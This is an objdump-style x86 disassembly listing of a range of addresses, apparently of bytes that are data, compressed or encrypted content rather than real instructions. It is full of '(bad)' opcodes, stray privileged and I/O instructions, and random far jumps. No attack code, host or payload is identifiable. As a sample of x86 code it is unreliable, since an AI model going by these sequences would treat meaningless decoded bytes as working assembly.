  411633:	lock adc DWORD PTR [ecx+ebp*8-0x3559d269],eax
  41163b:	rol    DWORD PTR [eax+0x48],1
  41163e:	iret   
  41163f:	push   cs
  411640:	cmp    DWORD PTR [edx-0x60],esp
  411643:	enter  0xe91a,0x62
  411647:	inc    eax
  411648:	sbb    DWORD PTR [edi+ecx*8+0x58],ebp
  41164c:	aad    0x6d
  41164e:	les    eax,FWORD PTR [ecx-0x5d]
  411651:	or     eax,0x5ba540fa
  411656:	idiv   DWORD PTR [edi]
  411658:	sbb    eax,esp
  41165a:	xchg   ebp,eax
  41165b:	std    
  41165c:	(bad)  
  41165d:	mov    ds:0x1a834370,eax
  411662:	sbb    cl,BYTE PTR [edi+0x2763fd61]
  411668:	pop    ss
  411669:	aas    
  41166a:	xor    bh,0xff
  41166d:	repnz (bad) 
  41166f:	jmp    FWORD PTR [eax+esi*4]
  411672:	xchg   edx,eax
  411673:	mov    ch,0xc8
  411675:	sub    DWORD PTR [edx+0x3ce3321e],edi
  41167b:	ins    DWORD PTR es:[edi],dx
  41167c:	mov    eax,0x6d8286f3
  411681:	aam    0xeb
  411683:	(bad)  
  411684:	lea    ebp,[edi-0x80]
  411687:	xor    dl,BYTE PTR [esi+0x7f]
  41168a:	fisttp WORD PTR [edi+0x6e]
  41168d:	cdq    
  41168e:	adc    BYTE PTR [edi-0x27e76ac3],al
  411694:	dec    ebp
  411695:	and    BYTE PTR [ebx-0x19],dh
  411698:	mov    BYTE PTR [esi+0x341c19e3],ch
  41169e:	pop    ebp
  41169f:	xchg   BYTE PTR [ecx+0x6908d358],ah
  4116a5:	adc    BYTE PTR [ebx+0x6ed21f54],ah
  4116ab:	mov    esi,0x947cd25
  4116b0:	push   edx
  4116b1:	inc    edx
  4116b2:	popf   
  4116b3:	dec    esi
  4116b4:	std    
  4116b5:	push   eax
  4116b6:	pop    ss
  4116b7:	(bad)  
  4116b8:	fcmovne st,st(0)
  4116ba:	hlt    
  4116bb:	inc    edi
  4116bc:	out    0x9d,eax
  4116be:	mov    edx,0xa4388b75
  4116c3:	stos   BYTE PTR es:[edi],al
  4116c4:	sahf   
  4116c5:	test   al,0x34
  4116c7:	jp     0x411711
  4116c9:	jmp    0x411685
  4116cb:	push   cs
  4116cc:	sub    DWORD PTR [ebp+0x12d77d96],eax
  4116d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116d3:	xchg   edx,eax
  4116d4:	cmp    eax,DWORD PTR ds:0x3c4c5711
  4116da:	mov    edx,0x55ed2ca
  4116df:	inc    ecx
  4116e0:	xlat   BYTE PTR ds:[ebx]
  4116e1:	or     DWORD PTR [eax+eiz*1],0x2f
  4116e5:	pop    ebx
  4116e6:	aaa    
  4116e7:	sar    ah,0x74
  4116ea:	int3   
  4116eb:	in     eax,0x45
  4116ed:	jg     0x41168a
  4116ef:	pop    esi
  4116f0:	out    0x4d,eax
  4116f2:	cmp    cl,BYTE PTR [edi-0x636cd09c]
  4116f8:	sbb    al,0x82
  4116fa:	xchg   ebx,eax
  4116fb:	ret    
  4116fc:	cmc    
  4116fd:	or     ebx,DWORD PTR [ebx]
  4116ff:	sahf   
  411700:	xchg   edx,eax
  411701:	imul   esp,DWORD PTR [ecx],0x69
  411704:	fstp   TBYTE PTR [edi+0x4e663c3a]
  41170a:	(bad)  
  41170b:	or     BYTE PTR [ebx-0x51],ah
  41170e:	scas   al,BYTE PTR es:[edi]
  41170f:	cdq    
  411710:	(bad)  
  411711:	aaa    
  411712:	jl     0x4116a3
  411714:	pop    eax
  411715:	mul    BYTE PTR [esi+eax*8-0x130aac3a]
  41171c:	in     eax,0xbb
  41171e:	(bad)  
  41171f:	in     al,0x83
  411721:	or     ch,BYTE PTR [eax+0x6bc7f030]
  411727:	dec    eax
  411728:	sbb    DWORD PTR [edx-0x2d28b53a],eax
  41172e:	cmc    
  41172f:	cmp    cl,BYTE PTR [esi-0x64ce20f7]
  411735:	jmp    0x411768
  411737:	das    
  411738:	mov    edi,esp
  41173a:	dec    ecx
  41173b:	add    DWORD PTR [ebp-0x54],ecx
  41173e:	cmp    ebx,DWORD PTR [edi]
  411740:	xor    al,0x84
  411742:	int3   
  411743:	lods   eax,DWORD PTR ds:[esi]
  411744:	mov    esi,0x193fae3e
  411749:	inc    ecx
  41174a:	adc    DWORD PTR [ebx-0x7c],ebp
  41174d:	inc    ebx
  41174e:	cmp    ch,BYTE PTR [eax]
  411750:	cmp    eax,0x2e7af7cc
  411755:	sbb    esi,DWORD PTR [ebx+0x4b720d9a]
  41175b:	and    al,0xeb
  41175d:	mov    eax,0xeede1312
  411762:	inc    edx
  411763:	mov    al,ds:0x93e8813f
  411768:	sbb    DWORD PTR [ebx],esp
  41176a:	nop
  41176b:	dec    esp
  41176c:	push   edi
  41176d:	push   eax
  41176e:	das    
  41176f:	or     al,0x3
  411771:	mov    eax,0x77d69736
  411776:	jo     0x4117ce
  411778:	lock mov esp,0xd97a189c
  41177e:	sahf   
  41177f:	xor    al,bh
  411781:	jle    0x4117f2
  411783:	test   DWORD PTR [ebx-0x685899ae],ebp
  411789:	(bad)  
  41178a:	sbb    al,0x6b
  41178c:	sahf   
  41178d:	inc    esi
  41178e:	xlat   BYTE PTR ds:[ebx]
  41178f:	imul   ebp,esi,0xfffffff6
  411792:	ret    
  411793:	push   ecx
  411794:	or     eax,0x3943862d
  411799:	push   edi
  41179a:	cmp    edx,0xffffffab
  41179d:	xchg   edx,eax
  41179e:	or     al,0xcb
  4117a0:	jecxz  0x41181e
  4117a2:	addr16 and al,0x40
  4117a5:	jmp    0x53ed:0x5698d2c6
  4117ac:	mov    bh,0xe6
  4117ae:	cs retf 
  4117b0:	lods   al,BYTE PTR ds:[esi]
  4117b1:	sbb    al,BYTE PTR [edi+0x2581c979]
  4117b7:	mov    BYTE PTR [edx+0x770c224],0x55
  4117be:	dec    ecx
  4117bf:	scas   eax,DWORD PTR es:[edi]
  4117c0:	neg    DWORD PTR [eax+0x6c]
  4117c3:	mov    esi,0xe03dd83e
  4117c8:	mov    ah,0xa4
  4117ca:	push   DWORD PTR [eax+0x4a]
  4117cd:	lods   al,BYTE PTR ds:[esi]
  4117cf:	scas   al,BYTE PTR es:[edi]
  4117d0:	outs   dx,DWORD PTR ds:[esi]
  4117d1:	js     0x411848
  4117d3:	push   esp
  4117d4:	inc    ebp
  4117d5:	inc    ebx
  4117d6:	jnp    0x411784
  4117d8:	xchg   ebp,eax
  4117d9:	cmp    ah,BYTE PTR [edx+0x1752e64]
  4117df:	jl     0x4117fb
  4117e1:	jl     0x411810
  4117e3:	inc    ecx
  4117e4:	cli    
  4117e5:	mov    al,0x12
  4117e7:	inc    edx
  4117e8:	(bad)
  4117eb:	adc    eax,0xdae004c7
  4117f0:	retf   
  4117f1:	push   esi
  4117f2:	(bad)  
  4117f3:	std    
  4117f4:	and    DWORD PTR [ebx],esp
  4117f6:	sahf   
  4117f7:	mov    ebp,0x756c2cca
  4117fc:	pop    ebx
  4117fd:	dec    edx
  4117fe:	fmul   DWORD PTR [ecx+eax*4]
  411801:	ret    
  411802:	pop    esi
  411804:	fdivr  DWORD PTR [edi]
  411806:	inc    esp
  411807:	mov    eax,0xc9b9b8df
  41180c:	jmp    0x4117df
  41180e:	jle    0x411795
  411810:	add    BYTE PTR [edi+0x4b],bl
  411813:	or     DWORD PTR [edx-0x4a],eax
  411816:	push   0x1b89d6d3
  41181b:	in     eax,0x68
  41181d:	in     eax,dx
  41181e:	xchg   edi,eax
  41181f:	dec    ebx
  411820:	stos   BYTE PTR es:[edi],al
  411821:	lock std 
  411823:	imul   edi,edi,0xc878e4d7
  411829:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41182a:	cld    
  41182b:	xor    al,0xb
  41182d:	add    al,dl
  41182f:	jecxz  0x4117f1
  411831:	sub    ebx,DWORD PTR [esi]
  411833:	sub    ebp,edi
  411835:	into   
  411836:	addr16 mov ah,0x3b
  411839:	jmp    DWORD PTR [edx]
  41183b:	rcr    BYTE PTR [ebp+0x68981934],cl
  411841:	and    bl,BYTE PTR [edi-0x38504acc]
  411847:	mov    ebx,0xcc43bb84
  41184c:	repnz sar cl,1
  41184f:	loope  0x41187d
  411851:	mov    ebx,0xb60a2dae
  411856:	les    esi,FWORD PTR [eax-0x6d036a69]
  41185c:	push   ebx
  41185d:	cmp    dl,BYTE PTR [ebx]
  41185f:	sbb    eax,0x78888e3d
  411864:	nop
  411865:	(bad)  
  411866:	cmp    BYTE PTR [esi+0x67],ch
  411869:	mov    ch,0xb4
  41186b:	in     al,0x4b
  41186d:	in     al,0xd5
  41186f:	and    ecx,DWORD PTR [eax-0x6eead9b1]
  411875:	cld    
  411876:	xchg   BYTE PTR [ecx+0x6e],al
  411879:	pop    ds
  41187a:	inc    ebx
  41187b:	gs enter 0x6942,0x87
  411880:	(bad)  
  411882:	push   ds
  411883:	push   ds
  411884:	jo     0x41187a
  411886:	xor    edi,DWORD PTR [edx]
  411888:	fsubrp st(3),st
  41188a:	dec    ebp
  41188b:	shl    BYTE PTR [ecx],1
  41188d:	cld    
  41188e:	enter  0x19b1,0x13
  411892:	ja     0x4118a7
  411894:	cmp    ebx,DWORD PTR [esi+ecx*8+0x60]
  411898:	jae    0x41189d
  41189a:	imul   eax,DWORD PTR [eax+edi*8-0x4e],0x824caf47
  4118a2:	imul   esp,DWORD PTR [eax+0x118c4763],0xffffff93
  4118a9:	mov    edi,0x6f031b88
  4118ae:	les    esi,FWORD PTR [ebp-0x7e5c2327]
  4118b4:	dec    esp
  4118b5:	cmp    al,0x7c
  4118b7:	or     cl,ch
  4118b9:	scas   al,BYTE PTR es:[edi]
  4118ba:	mov    al,0x4e
  4118bc:	icebp  
  4118bd:	ja     0x411867
  4118bf:	xchg   edx,eax
  4118c0:	inc    ebp
  4118c1:	xchg   esp,eax
  4118c2:	pop    ebx
  4118c3:	mov    bl,0x82
  4118c5:	push   ebx
  4118c6:	pop    ds
  4118c7:	adc    ebx,eax
  4118c9:	pop    esp
  4118ca:	arpl   WORD PTR [eax+ebp*8+0x7e268b09],dx
  4118d1:	arpl   si,di
  4118d3:	jmp    0xf36cbf59
  4118d8:	sti    
  4118d9:	inc    edx
  4118da:	xchg   ebp,eax
  4118db:	push   eax
  4118dc:	sub    BYTE PTR [edi],ch
  4118de:	inc    BYTE PTR [eax]
  4118e0:	sbb    eax,0x17603656
  4118e5:	or     esi,edi
  4118e7:	mov    ah,0x69
  4118e9:	ds in  al,dx
  4118eb:	popa   
  4118ec:	jle    0x4118e5
  4118ee:	mov    edx,0x4275bea9
  4118f3:	and    ebx,0x7c
  4118f6:	(bad)  
  4118f7:	mov    ds:0xf31ccdf6,al
  4118fc:	mov    DWORD PTR [edx-0x29a485f5],ebx
  411902:	lods   eax,DWORD PTR ds:[esi]
  411903:	push   ebx
  411904:	enter  0x64a2,0xdf
  411908:	shl    BYTE PTR ds:0xdb853ee7,1
  41190e:	mov    bh,0xb5
  411910:	adc    eax,0x6a11e0cd
  411915:	cmovbe ecx,DWORD PTR [ecx]
  411918:	and    DWORD PTR [ebp+esi*2+0x3dec80bc],esi
  41191f:	loope  0x4118de
  411921:	(bad)
  411924:	shl    DWORD PTR [esi],1
  411926:	scas   eax,DWORD PTR es:[edi]
  411927:	mov    al,0xf
  411929:	scas   al,BYTE PTR es:[edi]
  41192a:	jmp    0x7def:0xdfe025eb
  411931:	dec    eax
  411932:	test   BYTE PTR [ebp-0x53],bl
  411935:	test   DWORD PTR [edx+edx*1-0x80],ebx
  411939:	push   ss
  41193a:	dec    esi
  41193b:	out    dx,al
  41193c:	daa    
  41193d:	(bad)  
  41193e:	dec    edx
  41193f:	fwait
  411940:	pop    esp
  411941:	fiadd  WORD PTR [esi+edx*4+0x47a8210]
  411948:	mov    ds:0x3017e3ad,al
  41194d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41194e:	pop    eax
  41194f:	xlat   BYTE PTR ds:[ebx]
  411950:	mov    ebx,0x7c1c658b
  411955:	(bad)  
  411956:	mov    ss,WORD PTR [ebp-0x66]
  411959:	iret   
  41195a:	cld    
  41195b:	ror    BYTE PTR [esi+0x47],1
  41195e:	xor    DWORD PTR [ebx-0x13],0xe
  411962:	fcomp  DWORD PTR [esi-0x1a]
  411965:	dec    ebp
  411966:	jae    0x411906
  411968:	or     ah,BYTE PTR [edi+0x6b]
  41196b:	outs   dx,BYTE PTR ds:[esi]
  41196c:	std    
  41196d:	or     BYTE PTR [ebx-0x1f8226f3],0x7b
  411974:	push   0xbec0c3d4
  411979:	out    0x1d,al
  41197b:	or     eax,DWORD PTR [ecx]
  41197d:	push   eax
  41197e:	inc    ecx
  41197f:	gs and eax,0xe7a509f8
  411985:	pop    ecx
  411986:	adc    ebx,DWORD PTR [edi]
  411988:	in     eax,dx
  411989:	imul   ebp,eax,0x21277cd7
  41198f:	pop    ebp
  411990:	test   eax,0x6914ee8
  411995:	inc    ecx
  411996:	cli    
  411997:	and    ebp,DWORD PTR [edx+0x14]
  41199a:	xchg   esi,eax
  41199b:	(bad)  [ecx]
  41199d:	(bad)
  4119a0:	ret    
  4119a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119a2:	add    al,BYTE PTR [ecx+0x621b524f]
  4119a8:	inc    edx
  4119a9:	aas    
  4119aa:	stos   DWORD PTR es:[edi],eax
  4119ab:	inc    edx
  4119ac:	mov    ebp,0xc1265edc
  4119b1:	sub    edi,edi
  4119b3:	sbb    dh,cl
  4119b5:	inc    ebx
  4119b6:	ror    DWORD PTR ds:0xd3498248,cl
  4119bc:	mov    ebx,0xc57a7a5a
  4119c1:	out    dx,eax
  4119c2:	cmp    cl,BYTE PTR [esi+0x7b]
  4119c5:	fs ins BYTE PTR es:[edi],dx
  4119c7:	jbe    0x411a48
  4119c9:	es stos BYTE PTR es:[edi],al
  4119cb:	mov    BYTE PTR [edx],al
  4119cd:	mov    ebp,0x3452bb06
  4119d2:	ficomp DWORD PTR [edx-0x76965922]
  4119d8:	push   esp
  4119d9:	pop    ebp
  4119da:	add    al,0xd0
  4119dc:	adc    BYTE PTR [ebx],ah
  4119de:	xor    DWORD PTR [eax-0x20bb539c],ebp
  4119e4:	dec    ebp
  4119e5:	dec    ebx
  4119e6:	jo     0x411a47
  4119e8:	js     0x41197c
  4119ea:	(bad)  
  4119eb:	sub    al,BYTE PTR [ecx-0x80]
  4119ee:	dec    edi
  4119ef:	xchg   DWORD PTR [edx],ebp
  4119f1:	sub    ecx,DWORD PTR [edx-0x16166261]
  4119f7:	inc    ebx
  4119f8:	loop   0x4119e2
  4119fa:	add    DWORD PTR [ebp+0x0],esp
  4119fd:	xchg   ecx,eax
  4119fe:	inc    esi
  4119ff:	fsub   QWORD PTR [ebp-0x71]
  411a02:	ins    DWORD PTR es:[edi],dx
  411a03:	out    0xc2,al
  411a05:	mov    edx,0x1b1e3de3
  411a0a:	inc    ecx
  411a0b:	sbb    DWORD PTR [edi+0x32],edi
  411a0e:	and    al,BYTE PTR [edx+0x51a30c5a]
  411a14:	outs   dx,BYTE PTR ds:[esi]
  411a15:	push   esi
  411a16:	imul   edx,DWORD PTR [ebx+eax*4+0x64cf8e64],0x8747c17
  411a21:	cmp    al,0xa9
  411a23:	ret    
  411a24:	push   ebx
  411a25:	dec    eax
  411a26:	sbb    DWORD PTR [eax+0x1afc1bde],ecx
  411a2c:	(bad)  
  411a2d:	sbb    ch,dh
  411a2f:	jae    0x411a0e
  411a31:	in     al,0x40
  411a33:	dec    esp
  411a34:	adc    ebp,DWORD PTR [ebp+0x4f249e44]
  411a3a:	jns    0x4119de
  411a3c:	stos   DWORD PTR es:[edi],eax
  411a3d:	ror    DWORD PTR [eax-0x2ebd4e66],1
  411a43:	pushf  
  411a44:	out    dx,eax
  411a45:	je     0x411a81
  411a47:	sub    edi,esp
  411a49:	jle    0x411a97
  411a4b:	pop    ss
  411a4c:	int3   
  411a4d:	mov    ecx,0x4f717fae
  411a52:	(bad)  
  411a53:	or     al,0x57
  411a55:	dec    edx
  411a56:	jno    0x411ab7
  411a58:	and    al,ah
  411a5a:	std    
  411a5b:	loop   0x411a86
  411a5d:	mov    cl,0x9
  411a5f:	xor    al,BYTE PTR [ebx+0x5b7b9e98]
  411a65:	mov    edx,DWORD PTR [edx-0x4f778637]
  411a6b:	pop    ecx
  411a6c:	daa    
  411a6d:	in     al,dx
  411a6e:	mov    ebp,0x5ea6a7a0
  411a73:	jmp    0x411a3c
  411a75:	and    edx,DWORD PTR [ecx]
  411a77:	inc    edi
  411a78:	cmp    DWORD PTR [ebx-0x5d9a0e74],eax
  411a7e:	xor    eax,0x572b1d6a
  411a83:	stc    
  411a84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a85:	cmp    DWORD PTR [ebx-0x7c],ecx
  411a88:	loope  0x411a78
  411a8a:	hlt    
  411a8b:	int3   
  411a8c:	push   ebx
  411a8d:	push   ds
  411a8e:	xchg   ebx,eax
  411a8f:	pop    ss
  411a90:	sbb    DWORD PTR [esp+edi*1],esp
  411a93:	call   0x5175:0x339db247
  411a9a:	popa   
  411a9b:	imul   esp,DWORD PTR [ecx],0x76
  411a9e:	sbb    al,0xcb
  411aa0:	fsubrp st(5),st
  411aa2:	mov    esp,0xfba0d0ee
  411aa7:	inc    ebp
  411aa8:	je     0x411a57
  411aaa:	arpl   WORD PTR [ebx-0x440b99b7],bp
  411ab0:	(bad)
  411ab3:	adc    ch,BYTE PTR [edx]
  411ab5:	and    BYTE PTR [ebx-0x55],0x44
  411ab9:	jecxz  0x411aba
  411abb:	out    0x4d,eax
  411abd:	jo     0x411ac7
  411abf:	leavew 
  411ac1:	xchg   BYTE PTR [ebp-0x24],bh
  411ac4:	or     eax,edi
  411ac6:	xchg   ebp,eax
  411ac7:	repnz cs jmp 0x8908:0xc1c01ca3
  411ad0:	jl     0x411a87
  411ad2:	and    al,0xe4
  411ad4:	xor    eax,0xb21e6f42
  411ad9:	out    0x68,al
  411adb:	daa    
  411adc:	mov    ebp,0x10ac990b
  411ae1:	inc    ebp
  411ae2:	jbe    0x411b07
  411ae4:	inc    ebp
  411ae5:	add    al,0x64
  411ae7:	outs   dx,DWORD PTR ds:[esi]
  411ae8:	in     al,0xd8
  411aea:	and    DWORD PTR [ecx-0x19],ebp
  411aed:	mov    ds:0x9a346494,al
  411af2:	xchg   ebx,eax
  411af3:	mov    esi,0x8be62530
	...
  411cd0:	and    BYTE PTR [edi-0x200729d],bl
  411cd6:	out    dx,al
  411cd7:	mov    edi,0x4100ab8e
  411cdc:	les    ebp,FWORD PTR [eax-0x3a]
  411cdf:	in     eax,dx
  411ce0:	fld    DWORD PTR [ecx+eax*1+0x0]
  411ce4:	push   ds
  411ce5:	pop    es
  411ce6:	add    BYTE PTR [eax],al
  411ce8:	xchg   dl,bl
  411cea:	ja     0x411c6f
  411cec:	aad    0x91
  411cee:	call   0x2a1f:0x74bd7ddb
  411cf5:	in     eax,dx
  411cf6:	cmp    DWORD PTR [ecx],eax
  411cf8:	gs iret 
  411cfa:	imul   DWORD PTR [ebx]
  411cfc:	add    ch,bl
  411cfe:	xor    esp,DWORD PTR [ebx]
  411d00:	xlat   BYTE PTR ds:[ebx]
  411d01:	jg     0x411d5b
  411d03:	sub    eax,0x91114309
  411d08:	xchg   edx,eax
  411d09:	or     BYTE PTR [edi+0x5a],0x38
  411d0d:	out    0x2b,eax
  411d0f:	aad    0xbb
  411d11:	dec    ebp
  411d12:	push   ss
  411d13:	jg     0x411d42
  411d15:	(bad)  
  411d17:	xchg   edx,eax
  411d18:	lds    edx,FWORD PTR [edx]
  411d1a:	(bad)  
  411d1b:	popf   
  411d1c:	push   ss
  411d1d:	inc    edi
  411d1e:	cmp    BYTE PTR [ebp+0x6f37d3af],dl
  411d24:	sub    DWORD PTR [esi],esp
  411d26:	fnstsw WORD PTR [ebx-0x5d]
  411d29:	test   DWORD PTR [eax+0x3d],edx
  411d2c:	sub    ebp,DWORD PTR [ecx]
  411d2e:	mov    db1,esi
  411d31:	clc    
  411d32:	fsubr  st(1),st
  411d34:	arpl   WORD PTR [edx],bp
  411d36:	scas   al,BYTE PTR es:[edi]
  411d37:	sub    edi,DWORD PTR [edi+0x742246aa]
  411d3d:	cmp    cl,BYTE PTR [esi-0x49]
  411d40:	add    BYTE PTR [edi],bl
  411d42:	(bad)  
  411d43:	or     edx,DWORD PTR [edi+0x2e]
  411d46:	lds    edx,FWORD PTR [ecx-0x1f]
  411d49:	jnp    0x411d31
  411d4b:	in     eax,dx
  411d4c:	iret   
  411d4d:	or     al,0x6a
  411d4f:	retf   
  411d50:	icebp  
  411d51:	and    esi,DWORD PTR [edi+0x2522624]
  411d57:	sub    eax,0x9dfe4af3
  411d5c:	push   0x28
  411d5e:	clc    
  411d5f:	lods   al,BYTE PTR ds:[esi]
  411d60:	call   0x4b9ac552
  411d65:	bnd ret 0xed58
  411d69:	add    ecx,DWORD PTR [ecx]
  411d6b:	sbb    al,0xaa
  411d6d:	xchg   ebx,eax
  411d6e:	dec    esi
  411d6f:	add    DWORD PTR [eax-0x22],esp
  411d72:	inc    edi
  411d73:	dec    esi
  411d74:	xor    al,cl
  411d76:	fld    DWORD PTR [eax+0x5daf9f1f]
  411d7c:	hlt    
  411d7d:	dec    ebx
  411d7e:	int    0x1c
  411d80:	mov    bl,0x93
  411d82:	pushf  
  411d83:	add    DWORD PTR [esi+ecx*2],eax
  411d86:	call   0xc64f452
  411d8b:	pop    esp
  411d8c:	ins    DWORD PTR es:[edi],dx
  411d8d:	jge    0x411d59
  411d8f:	xor    al,0xe7
  411d91:	mov    cl,0xba
  411d93:	nop
  411d94:	in     eax,dx
  411d95:	xchg   al,al
  411d97:	xchg   esp,eax
  411d98:	jp     0x411d80
  411d9a:	pop    ecx
  411d9b:	sbb    ebx,DWORD PTR [ebp+0xfd6ba7b]
  411da1:	dec    BYTE PTR [ebp-0x5114614c]
  411da7:	mov    esi,0xf9f00650
  411dac:	dec    ecx
  411dad:	jmp    0xec3e:0x18627eb0
  411db4:	push   esp
  411db5:	pop    eax
  411db6:	outs   dx,BYTE PTR ds:[esi]
  411db7:	jmp    0x411d74
  411db9:	xor    DWORD PTR [ecx+0x1ba8e2ea],ebp
  411dbf:	popf   
  411dc0:	loope  0x411d5e
  411dc2:	nop
  411dc3:	sbb    al,0xfc
  411dc5:	dec    esp
  411dc6:	ret    0x7cf6
  411dc9:	mov    DWORD PTR [eax-0x44a78733],ebx
  411dcf:	test   al,0xf0
  411dd1:	test   BYTE PTR [ebp-0x70],0x3f
  411dd5:	in     al,dx
  411dd6:	cmp    ecx,DWORD PTR [ecx-0x7f]
  411dd9:	xor    al,0xc1
  411ddb:	mov    WORD PTR [ecx],?
  411ddd:	jg     0x411de6
  411ddf:	pop    ss
  411de0:	jb     0x411e5c
  411de2:	pop    ebp
  411de3:	xor    bh,BYTE PTR [eax+0x2f]
  411de6:	xor    eax,0x993d82d
  411deb:	je     0x411d90
  411ded:	mov    ebx,0x996e6a30
  411df2:	push   ebx
  411df3:	in     al,0xb4
  411df5:	and    edx,DWORD PTR [ebp-0x306e05bb]
  411dfb:	and    DWORD PTR [ebp-0x39],edi
  411dfe:	cwde   
  411dff:	pop    esp
  411e00:	mov    dh,0x26
  411e02:	shr    esi,1
  411e04:	in     al,0xdf
  411e06:	leave  
  411e07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e08:	arpl   WORD PTR [edx-0x77],bp
  411e0b:	jge    0x411e69
  411e0d:	mov    bl,0x6c
  411e0f:	sub    al,0xd7
  411e11:	retf   
  411e12:	(bad)  
  411e13:	scas   al,BYTE PTR es:[edi]
  411e14:	and    al,0x9b
  411e16:	xchg   DWORD PTR [eax+0x36],esi
  411e19:	test   BYTE PTR [edx-0x2b],ch
  411e1c:	jb     0x411ddf
  411e1e:	dec    esp
  411e1f:	int    0x8d
  411e21:	xchg   esp,eax
  411e22:	lods   eax,DWORD PTR ds:[esi]
  411e23:	punpcklbw mm4,DWORD PTR [edx-0x5982fc88]
  411e2a:	mov    cl,BYTE PTR [esi]
  411e2c:	xchg   BYTE PTR ds:0xa3b99116,ch
  411e33:	daa    
  411e34:	mov    bl,0x9c
  411e36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e37:	mov    bh,0x60
  411e39:	xchg   ecx,eax
  411e3a:	dec    esp
  411e3b:	fsubr  st(5),st
  411e3d:	popa   
  411e3e:	lock sub eax,0xe585351a
  411e44:	sar    DWORD PTR [ecx-0x11],0x2b
  411e48:	add    BYTE PTR [esi],0x3b
  411e4b:	es jmp 0xb2a6ea58
  411e51:	push   esp
  411e52:	or     ebx,DWORD PTR [edx+0x54]
  411e55:	dec    esp
  411e56:	es test esi,ecx
  411e59:	test   al,0x82
  411e5b:	and    edi,DWORD PTR [esi+ebp*1-0x65423f4e]
  411e62:	shl    DWORD PTR [ebx+0x783bfc68],1
  411e68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e69:	ss aaa 
  411e6b:	xchg   esi,eax
  411e6c:	pop    ebx
  411e6d:	xlat   BYTE PTR ds:[ebx]
  411e6e:	leave  
  411e6f:	or     BYTE PTR [ecx+ebp*4+0x79907911],cl
  411e76:	in     eax,0x86
  411e78:	es shl esi,1
  411e7b:	stos   BYTE PTR es:[edi],al
  411e7c:	out    dx,eax
  411e7d:	xor    eax,0x819c3e84
  411e82:	adc    DWORD PTR [eax+ebp*1],0xffffffd4
  411e86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e87:	pop    ebp
  411e88:	repz jbe 0x411e90
  411e8b:	xchg   ecx,eax
  411e8c:	mov    edx,edi
  411e8e:	jmp    0xb699:0x84b5e017
  411e95:	mov    ecx,0x2ab7f067
  411e9a:	mov    ebp,0xf81d70f8
  411e9f:	pusha  
  411ea0:	jmp    0x1669076e
  411ea5:	mov    ecx,0xd9ea473
  411eaa:	adc    dl,ch
  411eac:	or     al,0x13
  411eae:	mov    dh,0x1c
  411eb0:	push   ebp
  411eb1:	icebp  
  411eb2:	in     al,0xce
  411eb4:	mov    ds:0x38765f2b,al
  411eb9:	mov    dh,0x9e
  411ebb:	adc    bh,BYTE PTR [eax]
  411ebd:	(bad)
  411ec0:	sub    BYTE PTR ds:0x4e4f56fa,0x80
  411ec7:	mov    WORD PTR [ebx+0x27],cs
  411eca:	and    DWORD PTR [esi+ebp*1],ebp
  411ecd:	push   edi
  411ece:	mov    DWORD PTR [ecx],ecx
  411ed0:	in     al,0x2
  411ed2:	or     BYTE PTR [ebp-0x4742ea5d],0xae
  411ed9:	xchg   edx,eax
  411eda:	inc    ebp
  411edb:	imul   BYTE PTR [eax]
  411edd:	jbe    0x411e8f
  411edf:	ja     0x411f38
  411ee1:	pusha  
  411ee2:	pop    ss
  411ee3:	in     eax,dx
  411ee4:	test   DWORD PTR [edi],ebx
  411ee6:	mov    edx,0xf432a993
  411eeb:	addr16 sti 
  411eed:	dec    ebp
  411eee:	cmp    BYTE PTR [eax+ecx*8+0x53],cl
  411ef2:	ins    DWORD PTR es:[edi],dx
  411ef3:	outs   dx,DWORD PTR ds:[esi]
  411ef4:	cli    
  411ef5:	mov    ecx,0x80521567
  411efa:	mov    ds:0x4a631516,eax
  411eff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f00:	sub    DWORD PTR ds:0x2a693cbf,esi
  411f06:	cld    
  411f07:	sahf   
  411f08:	enter  0xa710,0x5e
  411f0c:	adc    dl,BYTE PTR [eax+0x5d]
  411f0f:	mov    eax,gs:0x84cc3c8
  411f15:	mov    dh,0x6a
  411f17:	jmp    0x411f1f
  411f19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f1a:	retf   
  411f1b:	xor    cl,BYTE PTR [ecx]
  411f1d:	sbb    dl,BYTE PTR [esi-0x7b]
  411f20:	jmp    DWORD PTR [esi-0x5603005b]
  411f26:	mov    al,0xdc
  411f28:	aaa    
  411f29:	mov    edx,0xca6dd9fb
  411f2e:	mov    DWORD PTR [eax-0x3dc494bd],eax
  411f34:	les    ebp,FWORD PTR [edi-0x6de3ad11]
  411f3a:	jecxz  0x411f5d
  411f3c:	call   0x6893:0xf60a75f3
  411f43:	(bad)  
  411f44:	test   DWORD PTR [esi+ecx*4+0x7351e50f],eax
  411f4b:	push   ecx
  411f4c:	or     eax,0x63524af9
  411f51:	jl     0x411fc1
  411f53:	shr    BYTE PTR [edx],cl
  411f55:	xlat   BYTE PTR ds:[ebx]
  411f56:	jmp    0x3577:0x3dbd5dad
  411f5d:	pop    eax
  411f5e:	inc    eax
  411f5f:	xchg   esp,eax
  411f60:	sbb    ebx,edi
  411f62:	jne    0x411f42
  411f64:	push   0x51
  411f66:	xchg   edx,eax
  411f67:	cmp    DWORD PTR [edx+ebx*8],edi
  411f6a:	mov    al,ds:0xd83277d2
  411f6f:	cmp    eax,0x51aa8412
  411f74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f75:	pop    ds
  411f76:	ins    BYTE PTR es:[edi],dx
  411f77:	sbb    DWORD PTR ds:0x62f2ffea,esp
  411f7d:	sbb    al,0xb0
  411f7f:	and    bh,BYTE PTR [eax]
  411f81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f82:	enter  0x34ac,0xb9
  411f86:	xchg   ecx,eax
  411f87:	jecxz  0x411fa2
  411f89:	mov    dl,0x43
  411f8b:	push   ds
  411f8c:	aad    0xd8
  411f8e:	mov    eax,0x4ce52526
  411f93:	adc    BYTE PTR [ebx],bl
  411f95:	outs   dx,BYTE PTR ds:[esi]
  411f96:	sbb    eax,0xc75b4aa5
  411f9b:	pushf  
